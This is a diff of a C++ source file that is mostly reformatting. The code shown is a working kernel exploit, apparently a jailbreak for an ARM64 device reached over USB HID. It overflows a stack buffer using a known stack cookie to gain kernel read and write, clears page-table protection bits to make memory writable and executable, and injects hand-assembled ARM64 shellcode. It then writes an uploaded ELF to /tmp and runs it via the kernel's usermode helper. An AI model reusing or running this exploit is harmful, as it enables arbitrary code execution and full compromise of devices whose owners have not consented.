@@ -1,28 +1,25 @@
 #include "rw.hpp"
+
+#include <chrono>
+#include <cstdint>
+#include <cstring>
+#include <fstream>
+#include <iostream>
+#include <thread>
+
 #include "constants.hpp"
 #include "logger.hpp"
 #include "utils.hpp"
 
-#include <algorithm>
-#include <chrono>
-#include <cstdint>
-#include <cstring>
-#include <iostream>
-#include <thread>
-#include <fstream>
 
 static void pack_q(std::vector<uint8_t>& buf, uint64_t val) {
     uint8_t* p = reinterpret_cast<uint8_t*>(&val);
     buf.insert(buf.end(), p, p + 8);
 }
 
-static inline void store_le32(uint8_t* p, uint32_t val) {
-    std::memcpy(p, &val, 4);
-}
+static inline void store_le32(uint8_t* p, uint32_t val) { std::memcpy(p, &val, 4); }
 
-static inline void store_le64(uint8_t* p, uint64_t val) {
-    std::memcpy(p, &val, 8);
-}
+static inline void store_le64(uint8_t* p, uint64_t val) { std::memcpy(p, &val, 8); }
 
 static inline uint64_t load_le64(const uint8_t* p) {
     uint64_t val;
@@ -42,12 +39,11 @@ static bool arm64_branch(uint64_t from, uint64_t to, bool link, uint32_t* instru
 static bool build_direct_context_helper(uint8_t out[constants::DIRECT_CONTEXT_SC_SIZE]) {
     std::memset(out, 0, constants::DIRECT_CONTEXT_SC_SIZE);
     uint32_t branch;
-    store_le32(out + 0, 0xF9400260); // ldr x0, [x19]
-    store_le32(out + 4, 0x91004000); // add x0, x0, #0x10
-    store_le32(out + 8, 0xA9005013); // stp x19, x20, [x0]
-    store_le32(out + 12, 0xA9015815); // stp x21, x22, [x0, #0x10]
-    if (!arm64_branch(constants::DIRECT_CONTEXT_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch))
-        return false;
+    store_le32(out + 0, 0xF9400260);   // ldr x0, [x19]
+    store_le32(out + 4, 0x91004000);   // add x0, x0, #0x10
+    store_le32(out + 8, 0xA9005013);   // stp x19, x20, [x0]
+    store_le32(out + 12, 0xA9015815);  // stp x21, x22, [x0, #0x10]
+    if (!arm64_branch(constants::DIRECT_CONTEXT_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
     store_le32(out + 16, branch);
     return true;
 }
@@ -55,15 +51,14 @@ static bool build_direct_context_helper(uint8_t out[constants::DIRECT_CONTEXT_SC
 static bool build_direct_read_helper(uint8_t out[constants::DIRECT_READ_SC_SIZE]) {
     std::memset(out, 0, constants::DIRECT_READ_SC_SIZE);
     uint32_t branch;
-    const uint32_t setup[] = { 0xF9400260, 0x91004000 };
+    const uint32_t setup[] = {0xF9400260, 0x91004000};
 
     // Byte entry
     store_le32(out + 0, setup[0]);
     store_le32(out + 4, setup[1]);
     store_le32(out + 8, 0x394003A1);
     store_le32(out + 12, 0x39000001);
-    if (!arm64_branch(constants::DIRECT_READ_BYTE_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch))
-        return false;
+    if (!arm64_branch(constants::DIRECT_READ_BYTE_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
     store_le32(out + 16, branch);
 
     // QWord entry
@@ -71,22 +66,15 @@ static bool build_direct_read_helper(uint8_t out[constants::DIRECT_READ_SC_SIZE]
     store_le32(out + 24, setup[1]);
     store_le32(out + 28, 0xF94003A1);
     store_le32(out + 32, 0xF9000001);
-    if (!arm64_branch(constants::DIRECT_READ_QWORD_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch))
-        return false;
+    if (!arm64_branch(constants::DIRECT_READ_QWORD_SC + 16, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
     store_le32(out + 36, branch);
 
     // Block entry
     store_le32(out + 40, setup[0]);
     store_le32(out + 44, setup[1]);
-    const uint32_t block[] = {
-        0xA9400BA1, 0xA9000801,
-        0xA9410BA1, 0xA9010801,
-        0xA9420BA1, 0xA9020801,
-        0xA9430BA1, 0xA9030801
-    };
+    const uint32_t block[] = {0xA9400BA1, 0xA9000801, 0xA9410BA1, 0xA9010801, 0xA9420BA1, 0xA9020801, 0xA9430BA1, 0xA9030801};
     for (size_t i = 0; i < 8; i++) store_le32(out + 48 + i * 4, block[i]);
-    if (!arm64_branch(constants::DIRECT_READ_BLOCK_SC + 40, constants::MTU3_COMPLETE_RESUME, false, &branch))
-        return false;
+    if (!arm64_branch(constants::DIRECT_READ_BLOCK_SC + 40, constants::MTU3_COMPLETE_RESUME, false, &branch)) return false;
     store_le32(out + 80, branch);
     return true;
 }
@@ -156,9 +144,7 @@ static bool build_cold_bootstrap(uint64_t req_buf, uint8_t stage[constants::COLD
         std::memcpy(&inst, direct_read + offset, 4);
         if (!append_cold_patch(stage, &count, constants::DIRECT_READ_SC + offset, inst)) return false;
     }
-    if (!arm64_branch(constants::COLD_PATCH_EXIT, constants::COLD_CLEANUP_SC, false, &branch) ||
-        !append_cold_patch(stage, &count, constants::COLD_PATCH_EXIT, branch))
-        return false;
+    if (!arm64_branch(constants::COLD_PATCH_EXIT, constants::COLD_CLEANUP_SC, false, &branch) || !append_cold_patch(stage, &count, constants::COLD_PATCH_EXIT, branch)) return false;
 
     std::memset(payload, 0, constants::COLD_BOOTSTRAP_PAYLOAD_SIZE);
     payload[0] = 0xF0;
@@ -176,11 +162,8 @@ static bool parse_cold_bootstrap_marker(const std::vector<uint8_t>& stage, uint6
 
     const uint8_t* marker = stage.data() + constants::COLD_MARKER_OFFSET;
     uint64_t address = load_le64(marker + 16);
-    if (load_le64(marker) != constants::COLD_MARKER_MAGIC0 ||
-        load_le64(marker + 8) != constants::COLD_MARKER_MAGIC1 ||
-        load_le64(marker + 24) != (address ^ constants::COLD_MARKER_XOR) ||
-        address < constants::PAGE_OFFSET_BASE ||
-        (address & (constants::COLD_BOOTSTRAP_STAGE_SIZE - 1U)) != 0)
+    if (load_le64(marker) != constants::COLD_MARKER_MAGIC0 || load_le64(marker + 8) != constants::COLD_MARKER_MAGIC1 || load_le64(marker + 24) != (address ^ constants::COLD_MARKER_XOR) ||
+        address < constants::PAGE_OFFSET_BASE || (address & (constants::COLD_BOOTSTRAP_STAGE_SIZE - 1U)) != 0)
         return false;
     *request_buffer = address;
     return true;
@@ -223,7 +206,7 @@ static bool find_request_buffer(const std::vector<uint8_t>& disclosure, uint64_t
 bool KernelRW::setup_read() {
     if (request_buffer != 0) return true;
 
-    static const uint8_t clean_epilogue[] = { 0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6 };
+    static const uint8_t clean_epilogue[] = {0xfd, 0x7b, 0xc1, 0xa8, 0xc0, 0x03, 0x5f, 0xd6};
 
     std::vector<uint8_t> disclosure = usb->hid_get(0xF2, 0x00, 0x1000);
     if (disclosure.size() != 0x1000) {
@@ -236,7 +219,7 @@ bool KernelRW::setup_read() {
 
     if (parse_cold_bootstrap_marker(disclosure, &req_buf)) {
         request_buffer = req_buf;
-        
+
         uint8_t test_buf[8] = {0};
         uint8_t context_buf[32] = {0};
         uint64_t live[4] = {0};
@@ -251,14 +234,8 @@ bool KernelRW::setup_read() {
 
             uint64_t verify_buf = 0;
             uint64_t verify_mep = 0;
-            context_ok = (live[0] >= constants::PAGE_OFFSET_BASE &&
-                          live[1] >= constants::PAGE_OFFSET_BASE &&
-                          live[2] >= constants::PAGE_OFFSET_BASE &&
-                          live[3] <= 255 &&
-                          direct_read_raw(live[0], (uint8_t*)&verify_buf, 8) &&
-                          verify_buf == req_buf &&
-                          direct_read_raw(live[0] + 0x68, (uint8_t*)&verify_mep, 8) &&
-                          verify_mep == live[1]);
+            context_ok = (live[0] >= constants::PAGE_OFFSET_BASE && live[1] >= constants::PAGE_OFFSET_BASE && live[2] >= constants::PAGE_OFFSET_BASE && live[3] <= 255 &&
+                          direct_read_raw(live[0], (uint8_t*)&verify_buf, 8) && verify_buf == req_buf && direct_read_raw(live[0] + 0x68, (uint8_t*)&verify_mep, 8) && verify_mep == live[1]);
         }
 
         if (text_ok && context_ok) {
@@ -267,9 +244,7 @@ bool KernelRW::setup_read() {
         }
 
         request_buffer = 0;
-        LOG_WARN << "    [-] Installed direct-reader self-test failed (text=" 
-                 << (text_ok ? "ok" : "mismatch") << ", context=" << (context_ok ? "ok" : "mismatch") 
-                 << "). Re-bootstrapping reader...\n";
+        LOG_WARN << "    [-] Installed direct-reader self-test failed (text=" << (text_ok ? "ok" : "mismatch") << ", context=" << (context_ok ? "ok" : "mismatch") << "). Re-bootstrapping reader...\n";
     }
 
     if (!find_request_buffer(disclosure, &req_buf, &votes)) {
@@ -308,9 +283,7 @@ bool KernelRW::setup_read() {
     return true;
 }
 
-uint64_t KernelRW::retrieve_get_alt() {
-    return 0;
-}
+uint64_t KernelRW::retrieve_get_alt() { return 0; }
 
 bool KernelRW::direct_exchange(uint64_t target, uint64_t helper, uint8_t* out, size_t length) {
     if (!out || !length || length > 64) return false;
@@ -357,7 +330,7 @@ static size_t direct_read_transfer_size(uint64_t address, size_t remaining, uint
 bool KernelRW::direct_read_raw(uint64_t address, uint8_t* out, size_t length) {
     if (!out || !length || address > UINT64_MAX - static_cast<uint64_t>(length - 1)) return false;
 
-    for (size_t offset = 0; offset < length; ) {
+    for (size_t offset = 0; offset < length;) {
         uint64_t helper = 0;
         size_t count = direct_read_transfer_size(address + offset, length - offset, &helper);
         if (!direct_exchange(address + offset, helper, out + offset, count)) {
@@ -382,8 +355,7 @@ uint64_t KernelRW::read_ptr(uint64_t addr) {
     return d.size() == 8 ? constants::u64(d.data()) : 0;
 }
 
-void KernelRW::repair_descriptor() {
-}
+void KernelRW::repair_descriptor() {}
 
 Registers KernelRW::discover_registers() {
     if (cached_registers.req != 0 && cached_registers.mep != 0 && cached_registers.x21 != 0) {
@@ -441,15 +413,15 @@ bool KernelRW::setup_write() {
 
         uint64_t patchLE = 0x17FFFFEBD503201F;
         patch_rwx(0xffffffbffc0a656C, 0x1000);
-        
+
         execute_tlb_flush();
-        
+
         // Write shellcode byte-by-byte
         LOG_DEBUG << "    Writing " << std::dec << constants::STR_SHELLCODE.size() << " bytes to 0x" << std::hex << constants::TEXT_STR_SC << "\n";
         for (size_t i = 0; i < constants::STR_SHELLCODE.size(); i++) {
             write_byte(constants::TEXT_STR_SC + i, constants::STR_SHELLCODE[i]);
         }
-        
+
         // Verify
         auto check = read(constants::TEXT_STR_SC, constants::STR_SHELLCODE.size());
         bool ok = (check == constants::STR_SHELLCODE);
@@ -471,12 +443,12 @@ bool KernelRW::write_byte(uint64_t addr, uint8_t val) {
     std::vector<uint8_t> buf = {0xF0, 0x01};
     buf.insert(buf.end(), 62, 0x00);
     pack_q(buf, constants::STACK_COOKIE);
-    pack_q(buf, 0); // X29
-    pack_q(buf, constants::CLEAN_RETURN); // X30
-    pack_q(buf, 0); // X19
-    pack_q(buf, addr - 0xCD); // X20
-    pack_q(buf, cached_registers.x21); // X21
-    pack_q(buf, val); // X22
+    pack_q(buf, 0);                        // X29
+    pack_q(buf, constants::CLEAN_RETURN);  // X30
+    pack_q(buf, 0);                        // X19
+    pack_q(buf, addr - 0xCD);              // X20
+    pack_q(buf, cached_registers.x21);     // X21
+    pack_q(buf, val);                      // X22
 
     return !_trigger_overflow(buf).empty();
 }
@@ -492,12 +464,12 @@ bool KernelRW::write_u64_fast(uint64_t addr, uint64_t val) {
     std::vector<uint8_t> buf = {0xF0, 0x01};
     buf.insert(buf.end(), 62, 0x00);
     pack_q(buf, constants::STACK_COOKIE);
-    pack_q(buf, 0); // X29
-    pack_q(buf, constants::TEXT_STR_SC); // X30
-    pack_q(buf, val); // X19
-    pack_q(buf, addr); // X20
-    pack_q(buf, cached_registers.x21); // X21
-    pack_q(buf, 0xFF); // X22
+    pack_q(buf, 0);                       // X29
+    pack_q(buf, constants::TEXT_STR_SC);  // X30
+    pack_q(buf, val);                     // X19
+    pack_q(buf, addr);                    // X20
+    pack_q(buf, cached_registers.x21);    // X21
+    pack_q(buf, 0xFF);                    // X22
 
     return !_trigger_overflow(buf).empty();
 }
@@ -525,22 +497,20 @@ bool KernelRW::write_data_fast(uint64_t addr, const std::vector<uint8_t>& data) 
 }
 
 bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
-    auto phys_to_virt = [](uint64_t phys) -> uint64_t {
-        return phys - constants::PHYS_OFFSET + constants::PAGE_OFFSET_BASE;
-    };
+    auto phys_to_virt = [](uint64_t phys) -> uint64_t { return phys - constants::PHYS_OFFSET + constants::PAGE_OFFSET_BASE; };
 
     LOG_DEBUG << "[*] Sweeping PTEs for " << std::dec << total_size << " bytes at 0x" << std::hex << base_vaddr << "...\n";
 
     uint64_t last_pgd_idx = -1;
     uint64_t pgd_entry = 0;
-    
+
     uint64_t last_pmd_idx = -1;
     uint64_t pmd_entry = 0;
 
     // Loop through every 4KB page in the requested size
     for (uint64_t offset = 0; offset < total_size; offset += 0x1000) {
         uint64_t vaddr = base_vaddr + offset;
-        
+
         uint64_t pgd_idx = (vaddr >> 30) & 0x1FF;
         uint64_t pmd_idx = (vaddr >> 21) & 0x1FF;
         uint64_t pte_idx = (vaddr >> 12) & 0x1FF;
@@ -548,7 +518,7 @@ bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
         if (pgd_idx != last_pgd_idx) {
             pgd_entry = read_ptr(constants::SWAPPER_PG_DIR + (pgd_idx * 8));
             last_pgd_idx = pgd_idx;
-            last_pmd_idx = -1; // Invalidate the cached PMD when crossing 1GB boundary
+            last_pmd_idx = -1;  // Invalidate the cached PMD when crossing 1GB boundary
         }
         if (!(pgd_entry & 1)) continue;
 
@@ -562,8 +532,8 @@ bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
         // Check if PMD is a 2MB block mapping
         if ((pmd_entry & 3) == 1) {
             uint64_t new_pmd = pmd_entry;
-            new_pmd &= ~(1ULL << 53); // Clear PXN (Make Executable)
-            new_pmd &= ~(1ULL << 7);  // Clear AP[2] (Make Writable)
+            new_pmd &= ~(1ULL << 53);  // Clear PXN (Make Executable)
+            new_pmd &= ~(1ULL << 7);   // Clear AP[2] (Make Writable)
 
             uint64_t pmd_addr = phys_to_virt(pgd_entry & ~0xFFF);
             uint64_t pmd_target_addr = pmd_addr + (pmd_idx * 8);
@@ -578,12 +548,12 @@ bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
                     }
                 }
             }
-            
+
             // Advance offset to the end of the 2MB block so we don't unnecessarily check every 4KB page
             uint64_t next_pmd_boundary = (vaddr & ~0x1FFFFFULL) + 0x200000;
             uint64_t skip_bytes = next_pmd_boundary - vaddr;
             if (skip_bytes > 0x1000) {
-                offset += (skip_bytes - 0x1000); 
+                offset += (skip_bytes - 0x1000);
             }
             pmd_entry = new_pmd;
         }
@@ -591,11 +561,11 @@ bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
         else if ((pmd_entry & 3) == 3) {
             uint64_t pte_addr = phys_to_virt(pmd_entry & ~0xFFF) + (pte_idx * 8);
             uint64_t pte_val = read_ptr(pte_addr);
-            
-            if (pte_val & 1) { // If PTE is valid
+
+            if (pte_val & 1) {  // If PTE is valid
                 uint64_t new_pte = pte_val;
-                new_pte &= ~(1ULL << 53); // Clear PXN (Make Executable)
-                new_pte &= ~(1ULL << 7);  // Clear AP[2] (Make Writable)
+                new_pte &= ~(1ULL << 53);  // Clear PXN (Make Executable)
+                new_pte &= ~(1ULL << 7);   // Clear AP[2] (Make Writable)
 
                 for (int i = 0; i < 8; i++) {
                     uint8_t old_byte = (pte_val >> (i * 8)) & 0xFF;
@@ -610,7 +580,7 @@ bool KernelRW::patch_rwx(uint64_t base_vaddr, size_t total_size) {
             }
         }
     }
-    
+
     LOG_DEBUG << "[+] Memory is now natively RWX!\n";
     return true;
 }
@@ -621,12 +591,12 @@ bool KernelRW::execute_tlb_flush() {
         LOG_ERROR << "[-] Failed to discover ISR registers for TLB payload.\n";
         return false;
     }
-    
+
     LOG_DEBUG << "[*] Writing TLB Shellcode to .bss...\n";
     std::vector<uint8_t> sc = constants::TLB_SHELLCODE;
     pack_q(sc, constants::RAW_SPIN_LOCK_ADDR);
     pack_q(sc, constants::ISR_EPILOGUE_ADDR);
-    
+
     if (!write_data_slow(constants::BSS_DATA, sc)) return false;
 
     LOG_DEBUG << "[*] Defeating WXN/PXN hardware protections...\n";
@@ -636,18 +606,18 @@ bool KernelRW::execute_tlb_flush() {
     std::vector<uint8_t> buf = {0xF0, 0x02};
     buf.insert(buf.end(), 62, 0x00);
     pack_q(buf, constants::STACK_COOKIE);
-    
+
     // usb_auth_ctrl_complete epilogue
-    pack_q(buf, 0);                                // X29
-    pack_q(buf, constants::TLBI_GADGET_ADDR);      // X30
-    
+    pack_q(buf, 0);                            // X29
+    pack_q(buf, constants::TLBI_GADGET_ADDR);  // X30
+
     // TLBI Gadget epilogue
-    pack_q(buf, 0);                                // SP+0x00: X29 
-    pack_q(buf, constants::BSS_DATA);              // SP+0x08: X30
-    pack_q(buf, regs.req);                         // SP+0x10: X19 
-    pack_q(buf, regs.mep);                         // SP+0x18: X20
-    pack_q(buf, regs.x21);                         // SP+0x20: X21
-    pack_q(buf, 0);                                // SP+0x28: Padding 
+    pack_q(buf, 0);                    // SP+0x00: X29
+    pack_q(buf, constants::BSS_DATA);  // SP+0x08: X30
+    pack_q(buf, regs.req);             // SP+0x10: X19
+    pack_q(buf, regs.mep);             // SP+0x18: X20
+    pack_q(buf, regs.x21);             // SP+0x20: X21
+    pack_q(buf, 0);                    // SP+0x28: Padding
 
     int res = usb->hid_set(0xF0, 0x02, buf);
     return res > 0;
@@ -664,12 +634,12 @@ void replace_quad(std::vector<uint8_t>& buf, uint64_t marker, uint64_t value) {
 
 bool KernelRW::trigger_workqueue(uint64_t target_func_addr) {
     uint64_t addr_work_struct = constants::TEXT_DATA + 0x50;
-    uint64_t addr_irq         = constants::TEXT_DATA + 0x70;
+    uint64_t addr_irq = constants::TEXT_DATA + 0x70;
 
     std::vector<uint8_t> payload;
 
-    uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0; 
-    uint64_t entry_addr = addr_work_struct + 0x08; 
+    uint64_t WORK_STRUCT_NO_POOL = 0x0FFFFFFFE0;
+    uint64_t entry_addr = addr_work_struct + 0x08;
     pack_q(payload, WORK_STRUCT_NO_POOL);
     pack_q(payload, entry_addr);
     pack_q(payload, entry_addr);
@@ -677,7 +647,7 @@ bool KernelRW::trigger_workqueue(uint64_t target_func_addr) {
 
     std::vector<uint8_t> stage1_sc = {
         0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!
-        
+
         0xA4, 0x02, 0x00, 0x58,  // 0x04: LDR X4, pc+84 -> Loads target_func_addr (from 0x58)
         0x24, 0x7B, 0x0B, 0xD5,  // 0x08: DC CVAU, X4
         0x24, 0x75, 0x0B, 0xD5,  // 0x0C: IC IVAU, X4
@@ -689,24 +659,24 @@ bool KernelRW::trigger_workqueue(uint64_t target_func_addr) {
         0x24, 0x75, 0x0B, 0xD5,  // 0x24: IC IVAU, X4
         0x9F, 0x3B, 0x03, 0xD5,  // 0x28: DSB ISH
         0xDF, 0x3F, 0x03, 0xD5,  // 0x2C: ISB
-        
+
         0x80, 0x00, 0x80, 0x52,  // 0x30: MOV W0, #4 (WORK_CPU_UNBOUND)
         0x61, 0x01, 0x00, 0x58,  // 0x34: LDR X1, pc+44 -> SYSTEM_WQ (from 0x60)
         0x21, 0x00, 0x40, 0xF9,  // 0x38: LDR X1, [X1]
         0x62, 0x01, 0x00, 0x58,  // 0x3C: LDR X2, pc+44 -> addr_work_struct (from 0x68)
         0x83, 0x01, 0x00, 0x58,  // 0x40: LDR X3, pc+48 -> QUEUE_WORK_ON (from 0x70)
-        0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3 
-        
+        0x60, 0x00, 0x3F, 0xD6,  // 0x44: BLR X3
+
         0x00, 0x00, 0x80, 0xD2,  // 0x48: MOV X0, #0
         0xFD, 0x7B, 0xC1, 0xA8,  // 0x4C: LDP X29, X30, [SP], #0x10
         0xC0, 0x03, 0x5F, 0xD6,  // 0x50: RET
         0x1F, 0x20, 0x03, 0xD5   // 0x54: NOP (Aligns exactly to 0x58)
     };
-    
-    pack_q(stage1_sc, target_func_addr);         // 0x58
-    pack_q(stage1_sc, constants::SYSTEM_WQ);     // 0x60
-    pack_q(stage1_sc, addr_work_struct);         // 0x68
-    pack_q(stage1_sc, constants::QUEUE_WORK_ON); // 0x70
+
+    pack_q(stage1_sc, target_func_addr);          // 0x58
+    pack_q(stage1_sc, constants::SYSTEM_WQ);      // 0x60
+    pack_q(stage1_sc, addr_work_struct);          // 0x68
+    pack_q(stage1_sc, constants::QUEUE_WORK_ON);  // 0x70
 
     payload.insert(payload.end(), stage1_sc.begin(), stage1_sc.end());
     write_data_fast(addr_work_struct, payload);
@@ -724,17 +694,17 @@ bool KernelRW::upload_to_tmp(const std::string& local_path, const std::string& r
     }
     std::vector<uint8_t> elf_data((std::istreambuf_iterator<char>(elf_file)), {});
 
-    uint64_t addr_filename   = rwx_base + 0x100;
+    uint64_t addr_filename = rwx_base + 0x100;
     uint64_t addr_debug_flag = rwx_base + 0x200;
-    uint64_t addr_shellcode  = rwx_base + 0x1000;
-    uint64_t addr_elf_data   = rwx_base + 0x2000;
+    uint64_t addr_shellcode = rwx_base + 0x1000;
+    uint64_t addr_elf_data = rwx_base + 0x2000;
 
     LOG_DEBUG << "[*] Streaming " << elf_data.size() << " bytes to kernel vmalloc buffer...\n";
-    write_data_fast(addr_elf_data, elf_data); 
+    write_data_fast(addr_elf_data, elf_data);
 
     std::string target_path = "/tmp/" + remote_name;
     std::vector<uint8_t> filename_data(target_path.begin(), target_path.end());
-    filename_data.push_back(0); 
+    filename_data.push_back(0);
     write_data_fast(addr_filename, filename_data);
     write_u64_fast(addr_debug_flag, 0);
 
@@ -778,14 +748,14 @@ bool KernelRW::upload_to_tmp(const std::string& local_path, const std::string& r
         0x1F, 0x20, 0x03, 0xD5   // 0x64: NOP (Aligns literal pool to 0x68)
     };
 
-    pack_q(dump_sc, addr_filename);           // 0x68
-    pack_q(dump_sc, constants::FILP_OPEN);    // 0x70
-    pack_q(dump_sc, addr_elf_data);           // 0x78
-    pack_q(dump_sc, elf_data.size());         // 0x80
-    pack_q(dump_sc, constants::KERNEL_WRITE); // 0x88
-    pack_q(dump_sc, constants::FILP_CLOSE);   // 0x90
-    pack_q(dump_sc, addr_debug_flag);         // 0x98
-    
+    pack_q(dump_sc, addr_filename);            // 0x68
+    pack_q(dump_sc, constants::FILP_OPEN);     // 0x70
+    pack_q(dump_sc, addr_elf_data);            // 0x78
+    pack_q(dump_sc, elf_data.size());          // 0x80
+    pack_q(dump_sc, constants::KERNEL_WRITE);  // 0x88
+    pack_q(dump_sc, constants::FILP_CLOSE);    // 0x90
+    pack_q(dump_sc, addr_debug_flag);          // 0x98
+
     write_data_fast(addr_shellcode, dump_sc);
 
     LOG_DEBUG << "[*] Executing native kernel disk write...\n";
@@ -795,7 +765,7 @@ bool KernelRW::upload_to_tmp(const std::string& local_path, const std::string& r
 
     for (int i = 0; i < 10; i++) {
         std::this_thread::sleep_for(std::chrono::milliseconds(10));
-        
+
         debug_flag = read_ptr(addr_debug_flag);
 
         if (debug_flag == 0x1337) {
@@ -803,7 +773,7 @@ bool KernelRW::upload_to_tmp(const std::string& local_path, const std::string& r
             return true;
         }
     }
-    
+
     LOG_ERROR << "[-] Failed to upload " << target_path << "\n";
     return false;
 }
@@ -818,18 +788,18 @@ bool KernelRW::execute_elf(const std::string& target_path, const std::vector<std
         LOG_DEBUG << oss.str();
     }
 
-    uint64_t addr_exec_sc  = rwx_base + 0x300;
-    uint64_t addr_debug    = rwx_base + 0x3E0;
-    uint64_t addr_argv     = rwx_base + 0x400; // Array of pointers
-    uint64_t addr_envp     = rwx_base + 0x600; // Array of pointers
-    uint64_t addr_strings  = rwx_base + 0x800; // Start writing string data here
+    uint64_t addr_exec_sc = rwx_base + 0x300;
+    uint64_t addr_debug = rwx_base + 0x3E0;
+    uint64_t addr_argv = rwx_base + 0x400;     // Array of pointers
+    uint64_t addr_envp = rwx_base + 0x600;     // Array of pointers
+    uint64_t addr_strings = rwx_base + 0x800;  // Start writing string data here
 
     uint64_t str_cursor = addr_strings;
     std::vector<uint64_t> argv_ptrs;
 
     uint64_t ptr_path = str_cursor;
     std::vector<uint8_t> path_data(target_path.begin(), target_path.end());
-    path_data.push_back(0); // Null terminator
+    path_data.push_back(0);  // Null terminator
     write_data_fast(ptr_path, path_data);
     str_cursor += path_data.size();
     argv_ptrs.push_back(ptr_path);
@@ -837,18 +807,14 @@ bool KernelRW::execute_elf(const std::string& target_path, const std::vector<std
     for (const auto& arg : args) {
         uint64_t ptr_arg = str_cursor;
         std::vector<uint8_t> arg_data(arg.begin(), arg.end());
-        arg_data.push_back(0); // Null terminator
+        arg_data.push_back(0);  // Null terminator
         write_data_fast(ptr_arg, arg_data);
         str_cursor += arg_data.size();
         argv_ptrs.push_back(ptr_arg);
     }
-    argv_ptrs.push_back(0); // NULL terminator for the argv array
+    argv_ptrs.push_back(0);  // NULL terminator for the argv array
 
-    std::vector<std::string> envs = {
-        "PATH=/tmp/bin",
-        "HOME=/",
-        "TERM=xterm"
-    };
+    std::vector<std::string> envs = {"PATH=/tmp/bin", "HOME=/", "TERM=xterm"};
     std::vector<uint64_t> envp_ptrs;
 
     for (const auto& env : envs) {
@@ -859,7 +825,7 @@ bool KernelRW::execute_elf(const std::string& target_path, const std::vector<std
         str_cursor += env_data.size();
         envp_ptrs.push_back(ptr_env);
     }
-    envp_ptrs.push_back(0); // NULL terminator for the envp array
+    envp_ptrs.push_back(0);  // NULL terminator for the envp array
 
     for (size_t i = 0; i < argv_ptrs.size(); i++) {
         write_u64_fast(addr_argv + (i * 8), argv_ptrs[i]);
@@ -893,13 +859,13 @@ bool KernelRW::execute_elf(const std::string& target_path, const std::vector<std
         0xC0, 0x03, 0x5F, 0xD6,  // 0x30: RET
         0x1F, 0x20, 0x03, 0xD5   // 0x34: NOP (Align)
     };
-    
+
     // Literal Pool
-    pack_q(exec_sc, ptr_path);                        // 0x38 (Points to the string directly)
-    pack_q(exec_sc, addr_argv);                       // 0x40 (Points to the array of pointers)
-    pack_q(exec_sc, addr_envp);                       // 0x48 (Points to the array of pointers)
-    pack_q(exec_sc, constants::CALL_UMH);             // 0x50
-    pack_q(exec_sc, addr_debug);                      // 0x58
+    pack_q(exec_sc, ptr_path);             // 0x38 (Points to the string directly)
+    pack_q(exec_sc, addr_argv);            // 0x40 (Points to the array of pointers)
+    pack_q(exec_sc, addr_envp);            // 0x48 (Points to the array of pointers)
+    pack_q(exec_sc, constants::CALL_UMH);  // 0x50
+    pack_q(exec_sc, addr_debug);           // 0x58
 
     write_data_fast(addr_exec_sc, exec_sc);
 
@@ -913,7 +879,7 @@ bool KernelRW::execute_elf(const std::string& target_path, const std::vector<std
             return true;
         }
     }
-    
+
     LOG_ERROR << "[-] Failed to execute ELF. Check kernel log.\n";
     return false;
 }
@@ -929,15 +895,15 @@ bool KernelRW::setup_jb_env() {
         LOG_DEBUG << "[*] Detected existing allocation at 0x" << std::hex << current_ptr << "\n";
         rwx_base = current_ptr;
     }
-    
+
     if (current_ptr == 0) {
         LOG_DEBUG << "[*] Setting up jailbreak env\n";
-        
-        uint64_t addr_worker      = constants::TEXT_DATA + 0x00; // Stage 2
-        uint64_t addr_work_struct = constants::TEXT_DATA + 0x60; // 32-byte struct
-        uint64_t addr_irq         = constants::TEXT_DATA + 0x80; // Stage 1
-        uint64_t addr_alloc_ptr   = constants::TEXT_DATA + 0xD8; // Final result slot
-        uint64_t addr_debug_flag  = constants::TEXT_DATA + 0xE0; // Debug flag slot
+
+        uint64_t addr_worker = constants::TEXT_DATA + 0x00;       // Stage 2
+        uint64_t addr_work_struct = constants::TEXT_DATA + 0x60;  // 32-byte struct
+        uint64_t addr_irq = constants::TEXT_DATA + 0x80;          // Stage 1
+        uint64_t addr_alloc_ptr = constants::TEXT_DATA + 0xD8;    // Final result slot
+        uint64_t addr_debug_flag = constants::TEXT_DATA + 0xE0;   // Debug flag slot
 
         write_u64_fast(addr_alloc_ptr, 0);
         write_u64_fast(addr_debug_flag, 0);
@@ -948,50 +914,50 @@ bool KernelRW::setup_jb_env() {
         std::vector<uint8_t> stage2_sc = {
             0xFD, 0x7B, 0xBF, 0xA9,  // 0x00: STP X29, X30, [SP, #-0x10]!
             0xFD, 0x03, 0x00, 0x91,  // 0x04: MOV X29, SP
-            
+
             // Arg 0: Size (256 KB = 0x40000)
             0x00, 0x00, 0x80, 0xD2,  // 0x08: MOV X0, #0
-            0x80, 0x00, 0xA0, 0xF2,  // 0x0C: MOVK X0, #0x4, LSL #16 
-            
+            0x80, 0x00, 0xA0, 0xF2,  // 0x0C: MOVK X0, #0x4, LSL #16
+
             // Arg 1: GFP Mask (GFP_KERNEL = 0xD0)
             0x01, 0x1A, 0x80, 0xD2,  // 0x10: MOV X1, #0xD0
-            
+
             // Arg 2: Protection (PAGE_KERNEL_EXEC = 0x713)
             0x62, 0xE2, 0x80, 0xD2,  // 0x14: MOV X2, #0x713
-            
+
             0x83, 0x01, 0x00, 0x58,  // 0x18: LDR X3, pc+48 (Loads __vmalloc_addr from 0x48)
-            0x60, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X3 
-            
+            0x60, 0x00, 0x3F, 0xD6,  // 0x1C: BLR X3
+
             0x81, 0x01, 0x00, 0x58,  // 0x20: LDR X1, pc+48 (Loads addr_alloc_ptr from 0x50)
             0x20, 0x00, 0x00, 0xF9,  // 0x24: STR X0, [X1] (Save result to BSS)
-            
+
             // --- Write Debug Flag (0x1337) ---
             0xE2, 0x66, 0x82, 0xD2,  // 0x28: MOV X2, #0x1337
